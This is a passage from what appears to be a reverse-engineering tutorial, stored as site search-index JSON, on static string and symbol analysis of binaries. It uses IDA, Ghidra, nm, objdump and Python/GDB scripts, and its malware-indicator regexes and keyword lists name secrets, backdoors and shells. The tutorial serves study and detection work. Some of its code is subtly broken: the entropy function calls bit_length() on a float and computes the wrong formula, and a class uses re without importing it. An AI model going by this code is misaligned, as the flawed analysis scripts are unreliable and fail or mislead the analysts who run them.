Alt+T: Search for specific strings\n- Use wildcards: \"pass*\" finds \"password\", \"passwd\"\n- Regular expressions supported\n\nCross-Reference Analysis:\n- Double-click string to see usage\n- Ctrl+X on string for all references\n</code></pre> <p>IDA Pro String Analysis Workflow: <pre><code>1. Open Strings window (Shift+F12)\n2. Filter strings of interest\n3. Double-click to navigate to usage\n4. Analyze context around string references\n5. Rename functions based on string content\n6. Document findings with comments\n</code></pre></p>"},{"location":"reverse-engineering/static/03-strings-symbols/#ghidra-string-analysis","title":"Ghidra String Analysis","text":"<pre><code>String Analysis in Ghidra:\n1. Search \u2192 For Strings\n2. Configure search parameters:\n   - Minimum string length\n   - Character encoding\n   - Search memory blocks\n3. Review results in table\n4. Navigate to references\n</code></pre> <p>Ghidra String Search Script: <pre><code>// FindCryptoStrings.java\nimport ghidra.app.script.GhidraScript;\nimport ghidra.program.model.listing.*;\nimport ghidra.program.model.mem.*;\n\npublic class FindCryptoStrings extends GhidraScript {\n    @Override\n    protected void run() throws Exception {\n        String[] cryptoKeywords = {\n            \"AES\", \"DES\", \"RSA\", \"SHA\", \"MD5\",\n            \"encrypt\", \"decrypt\", \"cipher\", \"hash\",\n            \"password\", \"secret\", \"private\", \"public\"\n        };\n\n        MemoryBlock[] blocks = currentProgram.getMemory().getBlocks();\n\n        for (MemoryBlock block : blocks) {\n            if (block.isInitialized()) {\n                findStringsInBlock(block, cryptoKeywords);\n            }\n        }\n    }\n\n    private void findStringsInBlock(MemoryBlock block, String[] keywords) \n            throws Exception {\n        // Implementation to search for strings\n        printf(\"Searching block: %s\\n\", block.getName());\n        // Search logic here\n    }\n}\n</code></pre></p>"},{"location":"reverse-engineering/static/03-strings-symbols/#symbol-analysis","title":"Symbol Analysis","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#understanding-symbol-tables","title":"Understanding Symbol Tables","text":"<pre><code># View symbol table\nnm binary_file\n\n# Show all symbols (including debug)\nnm -a binary_file\n\n# Show dynamic symbols\nnm -D binary_file\n\n# Demangle C++ symbols\nnm -C binary_file\n\n# Show symbol types\nnm -t x binary_file    # Hex addresses\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#symbol-types","title":"Symbol Types","text":"<pre><code>Symbol Types in nm output:\nT/t - Text section (code)\nD/d - Data section (initialized data)\nB/b - BSS section (uninitialized data)\nR/r - Read-only data\nU - Undefined (external references)\nW/w - Weak symbols\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#elf-symbol-analysis","title":"ELF Symbol Analysis","text":"<pre><code># Detailed ELF symbol information\nreadelf -s binary_file\n\n# Symbol version information\nreadelf -V binary_file\n\n# Dynamic symbol table\nreadelf --dyn-syms binary_file\n\n# Section headers\nreadelf -S binary_file\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#objdump-symbol-analysis","title":"Objdump Symbol Analysis","text":"<pre><code># Disassemble with symbols\nobjdump -d -t binary_file\n\n# Show all headers and symbols\nobjdump -x binary_file\n\n# Symbol table\nobjdump -T binary_file    # Dynamic symbols\nobjdump -t binary_file    # Regular symbols\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#advanced-string-analysis-techniques","title":"Advanced String Analysis Techniques","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#string-encryption-detection","title":"String Encryption Detection","text":"<pre><code>#!/usr/bin/env python3\nimport re\nimport string\nfrom collections import Counter\n\ndef analyze_string_entropy(text):\n    \"\"\"Calculate entropy to detect encrypted strings\"\"\"\n    if not text:\n        return 0\n\n    # Count character frequencies\n    counter = Counter(text)\n    length = len(text)\n\n    # Calculate entropy\n    entropy = 0\n    for count in counter.values():\n        probability = count / length\n        entropy -= probability * (probability.bit_length() - 1)\n\n    return entropy\n\ndef detect_obfuscated_strings(binary_path):\n    \"\"\"Find potentially obfuscated strings\"\"\"\n    import subprocess\n\n    # Get all strings\n    result = subprocess.run(['strings', binary_path], \n                          capture_output=True, text=True)\n    strings_list = result.stdout.split('\\n')\n\n    suspicious_strings = []\n\n    for s in strings_list:\n        if len(s) &lt; 8:  # Skip short strings\n            continue\n\n        entropy = analyze_string_entropy(s)\n\n        # High entropy might indicate encryption\n        if entropy &gt; 4.5:\n            suspicious_strings.append((s, entropy))\n\n        # Look for base64-like patterns\n        if re.match(r'^[A-Za-z0-9+/]+=*$', s) and len(s) % 4 == 0:\n            suspicious_strings.append((s, \"Base64-like\"))\n\n        # Hex-encoded strings\n        if re.match(r'^[0-9A-Fa-f]+$', s) and len(s) % 2 == 0:\n            suspicious_strings.append((s, \"Hex-encoded\"))\n\n    return suspicious_strings\n\n# Usage\nsuspicious = detect_obfuscated_strings('./malware_sample')\nfor string, reason in suspicious:\n    print(f\"Suspicious: {string[:50]}... ({reason})\")\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#string-decryption-analysis","title":"String Decryption Analysis","text":"<pre><code>#!/usr/bin/env python3\n\ndef analyze_xor_strings(binary_data, key_length=1):\n    \"\"\"Try to find XOR-encrypted strings\"\"\"\n    results = []\n\n    for offset in range(len(binary_data) - 20):\n        for key in range(1, 256):\n            decrypted = []\n            valid = True\n\n            for i in range(min(20, len(binary_data) - offset)):\n                char = binary_data[offset + i] ^ key\n\n                # Check if result is printable ASCII\n                if 32 &lt;= char &lt;= 126:\n                    decrypted.append(chr(char))\n                elif char == 0:  # Null terminator\n                    break\n                else:\n                    valid = False\n                    break\n\n            if valid and len(decrypted) &gt;= 5:\n                results.append({\n                    'offset': hex(offset),\n                    'key': hex(key),\n                    'string': ''.join(decrypted)\n                })\n\n    return results\n\ndef find_string_references(binary_path, target_string):\n    \"\"\"Find code references to specific strings\"\"\"\n    import subprocess\n\n    # Find string offset\n    result = subprocess.run(['strings', '-o', binary_path], \n                          capture_output=True, text=True)\n\n    string_offset = None\n    for line in result.stdout.split('\\n'):\n        if target_string in line:\n            parts = line.split(' ', 1)\n            string_offset = int(parts[0], 16)\n            break\n\n    if string_offset:\n        # Search for references to this offset in disassembly\n        disasm_result = subprocess.run(['objdump', '-d', binary_path],\n                                     capture_output=True, text=True)\n\n        references = []\n        for line in disasm_result.stdout.split('\\n'):\n            if hex(string_offset) in line:\n                references.append(line.strip())\n\n        return references\n\n    return []\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#dynamic-string-analysis","title":"Dynamic String Analysis","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef trace_string_operations():\n    \"\"\"Trace string operations during execution\"\"\"\n\n    # GDB script to trace string functions\n    gdb_script = '''\n    break strcpy\n    break strcat\n    break sprintf\n    break malloc\n\n    commands\n        printf \"String operation at %p\\\\n\", $rip\n        printf \"Arg1: %s\\\\n\", $rdi\n        if ($rsi != 0)\n            printf \"Arg2: %s\\\\n\", $rsi\n        end\n        backtrace 3\n        continue\n    end\n\n    run\n    '''\n\n    p = gdb.debug('./target', gdb_script)\n    return p\n\ndef monitor_heap_strings():\n    \"\"\"Monitor heap allocations for string patterns\"\"\"\n\n    # Hook malloc/free to track string allocations\n    gdb_script = '''\n    break malloc\n    commands\n        set $alloc_size = $rdi\n        printf \"malloc(%d) = \", $alloc_size\n        finish\n        printf \"%p\\\\n\", $rax\n        continue\n    end\n\n    break strcpy\n    commands\n        printf \"strcpy(%p, \\\\\"%s\\\\\")\\\\n\", $rdi, $rsi\n        continue\n    end\n    '''\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#string-based-vulnerability-discovery","title":"String-based Vulnerability Discovery","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#format-string-detection","title":"Format String Detection","text":"<pre><code>#!/usr/bin/env python3\nimport re\n\ndef find_format_string_vulns(binary_path):\n    \"\"\"Find potential format string vulnerabilities\"\"\"\n    import subprocess\n\n    # Disassemble binary\n    result = subprocess.run(['objdump', '-d', binary_path],\n                          capture_output=True, text=True)\n\n    dangerous_patterns = [\n        r'call.*printf',\n        r'call.*sprintf',\n        r'call.*fprintf',\n        r'call.*snprintf'\n    ]\n\n    vulnerabilities = []\n    lines = result.stdout.split('\\n')\n\n    for i, line in enumerate(lines):\n        for pattern in dangerous_patterns:\n            if re.search(pattern, line):\n                # Check if format string comes from user input\n                context = lines[max(0, i-5):i+2]\n                vulnerabilities.append({\n                    'line': line.strip(),\n                    'context': context,\n                    'risk': analyze_format_risk(context)\n                })\n\n    return vulnerabilities\n\ndef analyze_format_risk(context):\n    \"\"\"Analyze if format string might be user-controlled\"\"\"\n    user_input_indicators = [\n        'gets', 'scanf', 'fgets', 'read',\n        'argv', 'environ', 'getenv'\n    ]\n\n    context_text = ' '.join(context)\n\n    for indicator in user_input_indicators:\n        if indicator in context_text:\n            return \"HIGH\"\n\n    return \"MEDIUM\"\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#buffer-overflow-string-analysis","title":"Buffer Overflow String Analysis","text":"<pre><code>#!/usr/bin/env python3\n\ndef find_dangerous_string_functions():\n    \"\"\"Find usage of dangerous string functions\"\"\"\n\n    dangerous_functions = {\n        'strcpy': 'Use strncpy instead',\n        'strcat': 'Use strncat instead', \n        'sprintf': 'Use snprintf instead',\n        'gets': 'Use fgets instead',\n        'scanf': 'Specify field width',\n        'vsprintf': 'Use vsnprintf instead'\n    }\n\n    # Search in symbols and PLT\n    import subprocess\n\n    def check_binary(binary_path):\n        result = subprocess.run(['nm', '-D', binary_path],\n                              capture_output=True, text=True)\n\n        found_functions = []\n        for line in result.stdout.split('\\n'):\n            for func, suggestion in dangerous_functions.items():\n                if func in line and 'U ' in line:  # Undefined symbol (imported)\n                    found_functions.append((func, suggestion))\n\n        return found_functions\n\n    return check_binary\n\ndef analyze_string_boundaries():\n    \"\"\"Analyze string buffer boundaries\"\"\"\n\n    # Look for buffer allocations followed by string operations\n    gdb_script = '''\n    break malloc\n    commands\n        set $malloc_size = $rdi\n        set $malloc_addr = 0\n        finish\n        set $malloc_addr = $rax\n        printf \"Allocated %d bytes at %p\\\\n\", $malloc_size, $malloc_addr\n        continue\n    end\n\n    break strcpy\n    commands\n        if ($rdi == $malloc_addr)\n            printf \"strcpy to recently allocated buffer\\\\n\"\n            printf \"Buffer size: %d, String: %s\\\\n\", $malloc_size, $rsi\n            set $str_len = strlen($rsi)\n            if ($str_len &gt;= $malloc_size)\n                printf \"POTENTIAL OVERFLOW!\\\\n\"\n            end\n        end\n        continue\n    end\n    '''\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#practical-string-analysis-examples","title":"Practical String Analysis Examples","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#malware-string-analysis","title":"Malware String Analysis","text":"<pre><code>#!/usr/bin/env python3\n\ndef analyze_malware_strings(binary_path):\n    \"\"\"Analyze strings for malware indicators\"\"\"\n\n    import subprocess\n    import re\n\n    # Get all strings\n    result = subprocess.run(['strings', '-a', binary_path],\n                          capture_output=True, text=True)\n    strings_list = result.stdout.split('\\n')\n\n    indicators = {\n        'network': [],\n        'persistence': [],\n        'evasion': [],\n        'crypto': [],\n        'files': []\n    }\n\n    patterns = {\n        'network': [\n            r'https?://[^\\s]+',\n            r'\\d+\\.\\d+\\.\\d+\\.\\d+',\n            r'[a-zA-Z0-9.-]+\\.(?:com|net|org|ru|cn)',\n            r'(?:POST|GET|HTTP)',\n            r'User-Agent'\n        ],\n        'persistence': [\n            r'HKEY_.*\\\\.*Run',\n            r'\\\\Windows\\\\System32',\n            r'\\\\AppData\\\\Roaming',\n            r'svchost\\.exe',\n            r'winlogon\\.exe'\n        ],\n        'evasion': [\n            r'IsDebuggerPresent',\n            r'GetTickCount',\n            r'VirtualProtect',\n            r'CreateMutex',\n            r'Sleep'\n        ],\n        'crypto': [\n            r'(?:AES|DES|RSA)',\n            r'CryptGenKey',\n            r'CryptEncrypt',\n            r'CryptDecrypt'\n        ],\n        'files': [\n            r'\\.(?:exe|dll|bat|ps1|vbs)',\n            r'temp\\\\[^\\\\]+',\n            r'\\.tmp$'\n        ]\n    }\n\n    for string in strings_list:\n        for category, pattern_list in patterns.items():\n            for pattern in pattern_list:\n                if re.search(pattern, string, re.IGNORECASE):\n                    indicators[category].append(string)\n\n    return indicators\n\ndef generate_yara_rules_from_strings(indicators):\n    \"\"\"Generate YARA rules from string indicators\"\"\"\n\n    yara_rule = '''\nrule Generated_String_Rule {\n    meta:\n        description = \"Generated from string analysis\"\n        author = \"Automated Analysis\"\n\n    strings:\n'''\n\n    count = 1\n    for category, strings in indicators.items():\n        for string in strings[:5]:  # Limit to top 5 per category\n            if len(string) &gt; 4:\n                yara_rule += f'        $s{count} = \"{string}\"\\n'\n                count += 1\n\n    yara_rule += '''\n    condition:\n        any of them\n}\n'''\n\n    return yara_rule\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#license-and-copyright-analysis","title":"License and Copyright Analysis","text":"<pre><code>#!/usr/bin/env python3\n\ndef find_licensing_info(binary_path):\n    \"\"\"Extract licensing and copyright information\"\"\"\n\n    import subprocess\n    import re\n\n    result = subprocess.run(['strings', binary_path],\n                          capture_output=True, text=True)\n\n    licensing_patterns = [\n        r'Copyright.*\\d{4}',\n        r'\u00a9.*\\d{4}',\n        r'License',\n        r'GPL|MIT|BSD|Apache',\n        r'All rights reserved',\n        r'Proprietary',\n        r'Confidential'\n    ]\n\n    licensing_info = []\n\n    for line in result.stdout.split('\\n'):\n        for pattern in licensing_patterns:\n            if re.search(pattern, line, re.IGNORECASE):\n                licensing_info.append(line.strip())\n\n    return licensing_info\n\ndef find_version_info(binary_path):\n    \"\"\"Extract version information\"\"\"\n\n    import subprocess\n    import re\n\n    result = subprocess.run(['strings', binary_path],\n                          capture_output=True, text=True)\n\n    version_patterns = [\n        r'v?\\d+\\.\\d+\\.\\d+',\n        r'Version\\s*:?\\s*[\\d.]+',\n        r'Build\\s*:?\\s*\\d+',\n        r'\\d{4}-\\d{2}-\\d{2}',  # Date formats\n        r'Release\\s*:?\\s*[\\w\\d.]+'\n    ]\n\n    version_info = []\n\n    for line in result.stdout.split('\\n'):\n        for pattern in version_patterns:\n            match = re.search(pattern, line, re.IGNORECASE)\n            if match:\n                version_info.append({\n                    'string': line.strip(),\n                    'version': match.group()\n                })\n\n    return version_info\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#automation-and-scripting","title":"Automation and Scripting","text":""},{"location":"reverse-engineering/static/03-strings-symbols/#automated-string-analysis-pipeline","title":"Automated String Analysis Pipeline","text":"<pre><code>#!/usr/bin/env python3\n\nclass StringAnalyzer:\n    def __init__(self, binary_path):\n        self.binary_path = binary_path\n        self.strings = self.extract_strings()\n        self.analysis_results = {}\n\n    def extract_strings(self):\n        \"\"\"Extract all strings from binary\"\"\"\n        import subprocess\n        result = subprocess.run(['strings', '-a', '-n', '4', self.binary_path],\n                              capture_output=True, text=True)\n        return result.stdout.split('\\n')\n\n    def categorize_strings(self):\n        \"\"\"Categorize strings by type\"\"\"\n        categories = {\n            'urls': [],\n            'file_paths': [],\n            'registry_keys': [],\n            'error_messages': [],\n            'debug_strings': [],\n            'crypto_related': [],\n            'network_related': []\n        }\n\n        patterns = {\n            'urls': r'https?://[^\\s]+',\n            'file_paths': r'[A-Za-z]:\\\\[^&lt;&gt;:\"|?*\\s]+',\n            'registry_keys': r'HKEY_[A-Z_]+\\\\',\n            'error_messages': r'(?i)(error|exception|failed|invalid)',\n            'debug_strings': r'(?i)(debug|trace|log|verbose)',\n            'crypto_related': r'(?i)(encrypt|decrypt|hash|cipher|crypto)',\n            'network_related': r'(?i)(http|tcp|udp|socket|connect)'\n        }\n\n        for string in self.strings:\n            for category, pattern in patterns.items():\n                if re.search(pattern, string):\n                    categories[category].append(string)\n\n        return categories\n\n    def find_interesting_strings(self):\n        \"\"\"Find potentially interesting strings\"\"\"\n        interesting = []\n\n        keywords = [\n            'password', 'secret', 'key', 'token', 'auth',\n            'admin', 'root', 'config', 'setting',\n            'backdoor', 'shell', 'cmd', 'exec'\n        ]\n\n        for string in self.strings:\n            for keyword in keywords:\n                if keyword.lower() in string.lower():\n                    interesting.append({\n                        'string': string,\n                        'keyword': keyword,\n                        'context': 'Potentially sensitive'\n                    })\n\n        return interesting\n\n    def generate_report(self):\n        \"\"\"Generate comprehensive string analysis report\"\"\"\n        categories = self.categorize_strings()\n        interesting = self.find_interesting_strings()\n\n        report = f\"\"\"\nString Analysis Report for {self.binary_path}\n{'='*50}\n\nTotal Strings: {len(self.strings)}\n\nCategories:\n\"\"\"\n        for category, strings in categories.items():\n            if strings:\n                report += f\"\\n{category.upper()}: {len(strings)} strings\\n\"\n                for string in strings[:3]:  # Show first 3\n                    report += f\"  - {string[:80]}\\n\"\n                if len(strings) &gt; 3:\n                    report += f\"  ... and {len(strings) - 3} more\\n\"\n\n        if interesting:\n            report += f\"\\nInteresting Strings: {len(interesting)}\\n\"\n            for item in interesting[:10]:  # Show first 10\n                report += f\"  - {item['string'][:60]} [{item['keyword']}]\\n\"\n\n        return report\n\n    def export_json(self):\n        \"\"\"Export results as JSON\"\"\"\n        import json\n\n        results = {\n            'binary_path': self.binary_path,\n            'total_strings': len(self.strings),\n            'categories': self.categorize_strings(),\n            'interesting': self.find_interesting_strings(),\n            'all_strings': self.strings\n        }\n\n        return json.dumps(results, indent=2)\n\n# Usage\nif __name__ == \"__main__\":\n    import sys\n\n    if len(sys.argv) != 2:\n        print(\"Usage: python string_analyzer.py &lt;binary_path&gt;\")\n        sys.exit(1)\n\n    analyzer = StringAnalyzer(sys.argv[1])\n    print(analyzer.generate_report())\n</code></pre>"},{"location":"reverse-engineering/static/03-strings-symbols/#key-takeaways","title":"Key Takeaways","text":"<p>String Analysis Fundamentals</p> <ul> <li>Strings reveal functionality - Error messages, UI text, configuration</li> <li>Multiple encodings exist - ASCII, Unicode, wide strings</li> <li>Context matters - How and where strings are used</li> <li>Encryption detection - High entropy strings may be encrypted</li> <li>Cross-references - Track string usage throughout the program</li> </ul> <p>Analysis Best Practices</p> <ul> <li>Use multiple tools (strings, objdump, disassemblers)</li> <li>Look for patterns in string content and structure</li> <li>Check for obfuscation or encryption</li> <li>Correlate strings with symbols and functions</li> <li>Document findings for future reference</li> </ul> <p>Common Challenges</p> <ul> <li>Encrypted or obfuscated strings</li> <li>Dynamic string construction at runtime</li> <li>Wide character and Unicode strings</li> <li>Compressed or packed binaries</li> <li>Strings split across multiple locations</li> </ul> <p>Next: Dynamic Analysis - GDB Basics</p>"}]}